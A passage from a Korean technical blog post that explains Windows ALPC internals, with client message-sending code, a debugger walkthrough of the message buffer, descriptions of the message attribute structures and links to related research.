class="hljs-title">CreateMsgMem</span><span class="hljs-params">(PPORT_MESSAGE PortMessage, SIZE_T MessageSize, LPVOID Message)</span></span><span class="hljs-function"></span><span class="hljs-function">    LPVOID lpMem </span>= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MessageSize + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove(lpMem, PortMessage, <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE));    memmove((BYTE*)lpMem + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE), Message, MessageSize);    <span class="hljs-keyword">return</span>(lpMem);}</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; <code>lpMem</code>&#xC774; &#xBC14;&#xB85C;</p><pre><code class="hljs cpp">[ PORT_MESSAGE ][ Payload ]</code></pre><p>&#xD615;&#xD0DC;&#xC758; &#xC644;&#xC131;&#xB41C; &#xD558;&#xB098;&#xC758; ALPC &#xBA54;&#xC2DC;&#xC9C0; &#xBC84;&#xD37C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>main() &#xCABD;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xC4F0;&#xC8E0;.</p><pre><code class="hljs cpp">RtlSecureZeroMemory(&amp;pmSend, <span class="hljs-keyword">sizeof</span>(pmSend));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[.] Enter Message &gt; &quot;</span>);fgets(&amp;szInput, MSG_LEN, <span class="hljs-built_in">stdin</span>);pmSend.u1.s1.DataLength  = <span class="hljs-built_in">strlen</span>(szInput);pmSend.u1.s1.TotalLength = pmSend.u1.s1.DataLength + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE);lpMem = CreateMsgMem(&amp;pmSend, pmSend.u1.s1.DataLength, &amp;szInput);ntRet = NtAlpcSendWaitReceivePort(    hPort,                <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,                    <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,                 <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>                  <span class="hljs-comment">// Timeout</span>);</code></pre><p>&#xC815;&#xB9AC;&#xD558;&#xBA74;</p><ol><li>pmSend &#xC548;&#xC5D0; DataLength, TotalLength &#xC138;&#xD305;</li><li><p>CreateMsgMem()&#xC73C;&#xB85C;</p><p> [pmSend | &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xBB38;&#xC790;&#xC5F4;] &#xD55C; &#xB369;&#xC5B4;&#xB9AC; &#xBC84;&#xD37C; lpMem &#xC0DD;&#xC131;</p></li><li><p>lpMem &#xD3EC;&#xC778;&#xD130;&#xB97C; NtAlpcSendWaitReceivePort&#xC758; SendMessage&#xB85C; &#xC804;&#xB2EC;</p></li></ol><p>&#xBA54;&#xC2DC;&#xC9C0; &#xB0B4;&#xC6A9;&#xB3C4; &#xB514;&#xBC84;&#xAE45; &#xD574;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;?</p><p><img src="image%2012.png" alt="image.png"></p><p>&#xC790; Client&#xC5D0;&#xC11C; <strong>&#x201C;Hello HackyBoiz!&#x201D;&#xB97C; &#xBCF4;&#xB0C8;&#xC744; &#xB54C;, &#xBC84;&#xD37C;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0DD;&#xACBC;&#xB294;&#xC9C0;</strong> &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs cpp">ntRet = NtAlpcSendWaitReceivePort(    hPort,          <span class="hljs-comment">// HANDLE PortHandle</span>    <span class="hljs-number">0</span>,              <span class="hljs-comment">// ULONG Flags</span>    (PPORT_MESSAGE)lpMem, <span class="hljs-comment">// SendMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// SendMessageAttributes</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessage</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// BufferLength</span>    <span class="hljs-literal">NULL</span>,           <span class="hljs-comment">// ReceiveMessageAttributes</span>    <span class="hljs-literal">NULL</span>            <span class="hljs-comment">// Timeout</span>);</code></pre><p>&#xC800;&#xD76C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; NtAlpcSendWaitReceivePort &#xD568;&#xC218;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>lpMem &#xBCC0;&#xC218;&#xC5D0; &#xC544;&#xB9C8; &#xC800;&#xD76C;&#xAC00; &#xBCF4;&#xB0B8; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xB2F4;&#xACA8;&#xC788;&#xACA0;&#xC8E0;? &#xC9C1;&#xC811; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><p><img src="image%2013.png" alt="image.png"></p><p>r8 &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xBC14;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0; &#xC804;&#xCCB4; &#xBC84;&#xD37C;&#xC778;&#xB370;, PORT_MESSAGE + &#x201C;Hello HackyBoiz!&#x201D; &#xAC00; &#xB4E4;&#xC5B4;&#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCCAB; DWORD &#xAC00; 00390011 &#xC778; &#xC774;&#xC720;&#xB294;</p><ul><li>&#xD558;&#xC704; 2&#xBC14;&#xC774;&#xD2B8; = <code>0x0011</code> &#x2192; DataLength = 0x11 = 17 (&#xBB38;&#xC790;&#xC5F4; &#xAE38;&#xC774;)</li><li>&#xC0C1;&#xC704; 2&#xBC14;&#xC774;&#xD2B8; = <code>0x0039</code> &#x2192; TotalLength = 0x39 = 57 (PORT_MESSAGE + payload)</li></ul><p>&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;! </p><p>&#xC774;&#xB807;&#xAC8C; Send Buffer&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xACF5;&#xAC04;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD55C; &#xB4A4;, Server&#xC758; Receive Buffer&#xB85C; &#xBCF5;&#xC0AC;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;!</p><h2 id="4-ALPC-Message-Attribute"><a href="#4-ALPC-Message-Attribute" class="headerlink" title="4. ALPC Message Attribute"></a>4. ALPC Message Attribute</h2><p>&#xC790; &#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xB294; &#x201C;&#xD3EC;&#xD2B8;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB9CC;&#xB4E4;&#xACE0;, &#xC5B4;&#xB5BB;&#xAC8C; &#xC5F0;&#xACB0;&#xD558;&#xACE0;, &#xC5B4;&#xB5BB;&#xAC8C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xB294;&#xC9C0;&#x201D;&#xB97C; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; ALPC&#xAC00; &#xADF8;&#xB0E5; &#xBA54;&#xC2DC;&#xC9C0; &#xBCF4;&#xB0B4;&#xAE30;&#xB9CC; &#xD558;&#xB294; IPC&#xC600;&#xB2E4;&#xBA74; &#xAD73;&#xC774; &#xC774;&#xB807;&#xAC8C;&#xAE4C;&#xC9C0; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4; &#xC774;&#xC720;&#xAC00; &#xC5C6;&#xACA0;&#xC8E0;?</p><p>ALPC&#xAC00; &#xBCF5;&#xC7A1;&#xD55C; &#xC774;&#xC720;&#xB294; &#xBA54;&#xC2DC;&#xC9C0; &#xBCF8;&#xBB38; &#xB9D0;&#xACE0;&#xB3C4; &#xAC01;&#xC885; &#xBD80;&#xAC00; &#xC815;&#xBCF4;(Attribute<strong>)</strong>&#xB97C; &#xAC19;&#xC774; &#xBD99;&#xC5EC;&#xC11C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;!</p><ul><li>&#xBCF4;&#xC548; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; (Impersonation)</li><li>&#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC; &#xC139;&#xC158;(View)</li><li>&#xD578;&#xB4E4;(&#xD30C;&#xC77C;/&#xD504;&#xB85C;&#xC138;&#xC2A4;/&#xC139;&#xC158; &#xB4F1;)</li><li>&#xD1A0;&#xD070; &#xC815;&#xBCF4;</li><li>&#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;</li></ul><p>&#xC774;&#xB7F0; &#xAC83;&#xB4E4;&#xC744; &#xD55C; &#xBC88;&#xC758; NtAlpcSendWaitReceivePort &#xD638;&#xCD9C;&#xB85C; &#xAC19;&#xC774; &#xC6C0;&#xC9C1;&#xC774;&#xB294; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB77C;&#xACE0; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="4-1-Attribute-&#xBC84;&#xD37C;-&#xAD6C;&#xC870;"><a href="#4-1-Attribute-&#xBC84;&#xD37C;-&#xAD6C;&#xC870;" class="headerlink" title="4.1. Attribute &#xBC84;&#xD37C; &#xAD6C;&#xC870;"></a>4.1. Attribute &#xBC84;&#xD37C; &#xAD6C;&#xC870;</h3><p>&#xC55E;&#xC5D0;&#xC11C; &#xBD24;&#xB358; <code>NtAlpcSendWaitReceivePort()</code>&#xD568;&#xC218; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF4;&#xBA74;, &#xC911;&#xAC04;&#xC5D0; Attribute &#xAD00;&#xB828; &#xC778;&#xC790;&#xAC00; &#xB450; &#xAC1C; &#xB354; &#xC788;&#xB294; &#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,    <span class="hljs-comment">// &#x2190; &#xC1A1;&#xC2E0; Attribute</span></span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes, <span class="hljs-comment">// &#x2190; &#xC218;&#xC2E0; Attribute</span></span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li><p><code>SendMessageAttributes</code></p><p>  &#x2192; &#xB0B4;&#xAC00; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0BC; &#xB54C; &#xAC19;&#xC774; &#xBD99;&#xC774;&#xACE0; &#xC2F6;&#xC740; Attribute</p></li><li><p><code>ReceiveMessageAttributes</code></p><p>  &#x2192; &#xB098;&#xB294; &#xC751;&#xB2F5; &#xBC1B;&#xC744; &#xB54C; <em>**</em>&#xC5B4;&#xB5A4; Attribute&#xB97C; &#xBC1B;&#xACE0; &#xC2F6;&#xC740;&#xC9C0;&#xB97C; &#xC9C0;&#xC815;</p></li></ul><p>&#xC989;, &#xC30D;&#xBC29; &#xD569;&#xC758; &#xAE30;&#xBC18; Attribute &#xC804;&#xB2EC; &#xAD6C;&#xB3C4;&#xB77C;&#xACE0; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xB124;&#xC694;!</p><p>Attribute &#xBC84;&#xD37C; &#xB9E8; &#xC55E;&#xC5D0;&#xB294; &#xACF5;&#xD1B5; &#xD5E4;&#xB354;&#xAC00; &#xD558;&#xB098; &#xBD99;&#xC5B4;&#xC788;&#xB294;&#xB370;&#xC694;,</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_ATTRIBUTES</span> {</span>    ULONG AllocatedAttributes;  <span class="hljs-comment">// &#xC774; &#xBC84;&#xD37C;&#xAC00; &#xC5B4;&#xB5A4; Attribute &#xACF5;&#xAC04;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0;</span>    ULONG ValidAttributes;     } ALPC_MESSAGE_ATTRIBUTES, *PALPC_MESSAGE_ATTRIBUTES;</code></pre><ul><li><p><code>AllocatedAttributes</code></p><p>  &#x2192; &#xC774; &#xBC84;&#xD37C;&#xC5D0; &#xC5B4;&#xB5A4; Attribute &#xD0C0;&#xC785;&#xB4E4; &#xACF5;&#xAC04;&#xC744; &#xD655;&#xBCF4;&#xD588;&#xB294;&#xC9C0; &#xBE44;&#xD2B8; &#xD50C;&#xB798;&#xADF8;&#xB85C; &#xD45C;&#xD604;</p></li><li><p><code>ValidAttributes</code></p><p>  &#x2192; &#xC774;&#xBC88; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC720;&#xD6A8;&#xD55C; Attribute</p></li></ul><p>&#xC815;&#xB9AC;&#xD558;&#xC790;&#xBA74;,</p><pre><code class="hljs ini"><span class="hljs-attr">AllocatedAttributes</span> = &#x201C;&#xC774; &#xBC84;&#xD37C;&#xC5D0; &#xBB50;&#xAE4C;&#xC9C0; &#xB2F4;&#xC744; &#xC218; &#xC788;&#xC74C;!&#x201D;<span class="hljs-attr">ValidAttributes</span> = &#x201C;&#xC774;&#xBC88; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC4F0;&#xB294; &#xAC83;&#x201D;</code></pre><p>&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="4-2-&#xC8FC;&#xC694;-Attribute-&#xC885;&#xB958;"><a href="#4-2-&#xC8FC;&#xC694;-Attribute-&#xC885;&#xB958;" class="headerlink" title="4.2 &#xC8FC;&#xC694; Attribute &#xC885;&#xB958;"></a>4.2 &#xC8FC;&#xC694; Attribute &#xC885;&#xB958;</h3><p>Attribute&#xB3C4; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370;, &#xB300;&#xD45C;&#xC801;&#xC778; &#xBA87; &#xAC1C;&#xB9CC; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><blockquote><p><strong>1. &#xBCF4;&#xC548; &#xC18D;&#xC131; (Security Attribute)</strong></p></blockquote><p>&#xBC1C;&#xC2E0;&#xC790;&#xC758; &#xBCF4;&#xC548; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBA70;, &#xBA54;&#xC2DC;&#xC9C0; &#xC218;&#xC2E0; &#xCE21;&#xC740; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBC1C;&#xC2E0;&#xC790;&#xB97C; Impersonation&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_SECURITY_ATTR</span> {</span>    ULONG Flags;    PSECURITY_QUALITY_OF_SERVICE pQOS;    HANDLE ContextHandle;} ALPC_SECURITY_ATTR, *PALPC_SECURITY_ATTR;</code></pre><ul><li>pQos<ul><li>SECURITY_QUALITY_OF_SERVICE &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130;</li><li>&#xC5B4;&#xB5A4; &#xC218;&#xC900;&#xC758; impersonation, context tracking &#xB4F1;&#xC744; &#xD5C8;&#xC6A9;&#xD560;&#xC9C0; &#xC124;&#xC815;</li></ul></li><li>ContextHandle<ul><li>&#xCEE4;&#xB110;&#xC774; &#xAD00;&#xB9AC;&#xD558;&#xB294; security context &#xD578;&#xB4E4;</li></ul></li></ul><hr><blockquote><p><strong>2. View &#xC18D;&#xC131; (Data View Attribute)</strong></p></blockquote><p>&#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC; &#xC139;&#xC158;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC77C;&#xBC18; &#xBA54;&#xC2DC;&#xC9C0; &#xD06C;&#xAE30; &#xC81C;&#xD55C;(64KB)&#xC744; &#xCD08;&#xACFC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_DATA_VIEW_ATTR</span> {</span>    ULONG  Flags;    HANDLE SectionHandle;  <span class="hljs-comment">// ALPC &#xD3EC;&#xD2B8;&#xC5D0; attach&#xB41C; &#xC139;&#xC158; &#xD578;&#xB4E4;</span>    PVOID  ViewBase;       <span class="hljs-comment">// &#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB9E4;&#xD551;&#xB41C; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;</span>    SIZE_T ViewSize;       <span class="hljs-comment">// &#xB9E4;&#xD551; &#xD06C;&#xAE30;</span>} ALPC_DATA_VIEW_ATTR, *PALPC_DATA_VIEW_ATTR;</code></pre><ol><li><code>NtAlpcCreatePortSection</code> / <code>NtAlpcCreateSectionView</code> &#xB85C; &#xACF5;&#xC720; &#xC139;&#xC158; &#xC0DD;&#xC131; + &#xBDF0; &#xC124;&#xC815;</li><li>&#xADF8; &#xC815;&#xBCF4;&#xB97C; <code>ALPC_DATA_VIEW_ATTR</code> &#xC5D0; &#xB123;&#xACE0;</li><li>Attribute &#xBC84;&#xD37C;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xAC19;&#xC774; &#xC804;&#xC1A1;</li><li>&#xC0C1;&#xB300;&#xBC29;&#xC740; &#xC790;&#xC2E0;&#xC758; &#xC8FC;&#xC18C; &#xACF5;&#xAC04;&#xC5D0; &#xAC19;&#xC740; &#xC139;&#xC158; &#xBDF0;&#xB97C; &#xB9E4;&#xD551;&#xD574;&#xC11C; &#xAC19;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xACF5;&#xC720;</li></ol><hr><blockquote><p><strong>3. Context &#xC18D;&#xC131;</strong></p></blockquote><p>&#xD2B9;&#xC815; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xB610;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xBD80;&#xC5EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBC84;&#xB294; &#xC774; &#xC18D;&#xC131;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xAC01; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC0C1;&#xD0DC; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC8E0;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_CONTEXT_ATTR</span> {</span>    PVOID PortContext;     <span class="hljs-comment">// &#xC774; &#xD3EC;&#xD2B8;(&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;)&#xC5D0; &#xBD99;&#xC5EC;&#xB454; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;</span>    PVOID MessageContext;  <span class="hljs-comment">// &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xBD99;&#xC5EC;&#xB454; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;</span>    ULONG Sequence;        <span class="hljs-comment">// &#xC2DC;&#xD000;&#xC2A4; &#xBC88;&#xD638;</span>    ULONG MessageId;       <span class="hljs-comment">// &#xBA54;&#xC2DC;&#xC9C0; ID</span>    ULONG CallbackId;      <span class="hljs-comment">// &#xCF5C;&#xBC31; ID</span>} ALPC_CONTEXT_ATTR, *PALPC_CONTEXT_ATTR;</code></pre><ul><li><code>PortContext</code><ul><li>&#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xD3EC;&#xD2B8;&#xC5D0; &#xC2EC;&#xC5B4;&#xB454; &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130; (&#xC138;&#xC158; ID, &#xC720;&#xC800; &#xC815;&#xBCF4; &#xB4F1;)</li></ul></li><li><code>MessageContext</code><ul><li>&#xD2B9;&#xC815; &#xBA54;&#xC2DC;&#xC9C0;&#xBCC4;&#xB85C; &#xBCC4;&#xB3C4; &#xC815;&#xBCF4; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC2F6;&#xC744; &#xB54C; &#xC0AC;&#xC6A9;</li></ul></li><li><code>Sequence</code> / <code>MessageId</code> / <code>CallbackId</code><ul><li>&#xCEE4;&#xB110;&#xC774; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC12;&#xB4E4;</li><li>TCP&#xCC98;&#xB7FC; &#x201C;&#xAD6C;&#xC870;&#xD654;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0; &#xCC98;&#xB9AC;&#x201D;&#xB97C; &#xD558;&#xAE30; &#xC704;&#xD55C; &#xAC1C;&#xB150; (&#xC694;&#xCCAD;&#x2013;&#xC751;&#xB2F5; &#xB9E4;&#xCE6D; &#xB4F1;)</li></ul></li></ul><hr><blockquote><p><strong>4. Handle &#xC18D;&#xC131;</strong></p></blockquote><p>&#xAC1D;&#xCCB4; &#xD578;&#xB4E4;&#xC744; &#xBA54;&#xC2DC;&#xC9C0;&#xC640; &#xD568;&#xAED8; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_MESSAGE_HANDLE_INFORMATION</span> {</span>    ULONG Index;        <span class="hljs-comment">// Attribute &#xBC84;&#xD37C; &#xB0B4; &#xC778;&#xB371;&#xC2A4;</span>    ULONG Flags;    ULONG Handle;       <span class="hljs-comment">// &#xB118;&#xAE30;&#xB824;&#xB294; &#xD578;&#xB4E4; &#xAC12; (sender &#xAE30;&#xC900;)</span>    ULONG ObjectType;   <span class="hljs-comment">// &#xAC1D;&#xCCB4; &#xD0C0;&#xC785;</span>    ACCESS_MASK GrantedAccess;<span class="hljs-comment">// &#xC218;&#xC2E0; &#xCE21;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xAD8C;&#xD55C;</span>} ALPC_MESSAGE_HANDLE_INFORMATION, *PALPC_MESSAGE_HANDLE_INFORMATION;</code></pre><ul><li>&#xCEE4;&#xB110;&#xC740; &#xD578;&#xB4E4;&#xC774; &#xC9C4;&#xC9DC; &#xC720;&#xD6A8;&#xD55C;&#xC9C0;, &#xAD8C;&#xD55C;&#xC740; &#xB9DE;&#xB294;&#xC9C0;, cross-process dup &#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0; &#xAC80;&#xC0AC;</li><li>&#xC218;&#xC2E0;&#xC790;&#xB294; &#xC774; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC790;&#xC2E0;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD578;&#xB4E4;&#xB85C; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;</li></ul><h2 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h2><p><img src="image%2014.png" alt="image.png"></p><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xAC00; ALPC&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD750;&#xB984;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!! &#xAC89;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74; &#xADF8;&#xB0E5; IPC &#xD55C; &#xB369;&#xC5B4;&#xB9AC; &#xAC19;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294;</p><ul><li>&#xD3EC;&#xD2B8; &#xAC1D;&#xCCB4; &#xAD00;&#xB9AC;</li><li>PORT_MESSAGE &#xD5E4;&#xB354; &#xCC98;&#xB9AC;</li><li>&#xAC01;&#xC885; Attribute &#xD30C;&#xC2F1;</li><li>&#xC139;&#xC158; &#xBDF0; &#xB9E4;&#xD551;, &#xAD8C;&#xD55C; &#xAC80;&#xC99D;, &#xD578;&#xB4E4; &#xC911;&#xBCF5; &#xC0DD;&#xC131; &#xB4F1;</li></ul><p>&#xC774;&#xB7F0; &#xAC83;&#xB4E4;&#xC774; &#xD55C;&#xBC88;&#xC758; <code>NtAlpcSendWaitReceivePort()</code> &#xD638;&#xCD9C; &#xC548;&#xC5D0;&#xC11C; &#xB2E4; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xAD6C;&#xC870;&#xC785;&#xB2C8;&#xB2E4;!!</p><p>&#xADF8;&#xB798;&#xC11C; &#xC2E4;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xB3C4; Attribute &#xD574;&#xC11D; &#xBC0F; &#xAC80;&#xC99D; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD130;&#xC9C0;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xB2E4;&#xACE0; &#xD558;&#xB124;&#xC694;!</p><p>&#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; ALPC &#xAE30;&#xBC18; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xC124;&#xBA85;&#xB4DC;&#xB9AC;&#xACE0; &#xC2F6;&#xAD70;&#xC694;! &#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4; &#xB2E4;&#xC74C;&#xC5D0; &#xB9CC;&#xB098;&#xC694;~! &#x1F44B;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/">https://ti.qianxin.com/blog/articles/the-tragedy-of-alpc-unknown-windows-privilege-escalation-nday-vulnerability-research-in-august-en/</a></p></li><li><p><a href="https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html">https://csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC.html</a></p></li><li><p><a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html">https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html</a></p></li><li><p><a href="https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf">https://recon.cx/2008/a/thomas_garnier/LPC-ALPC-paper.pdf</a></p></li><li><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape</a></p></li><li><p><a 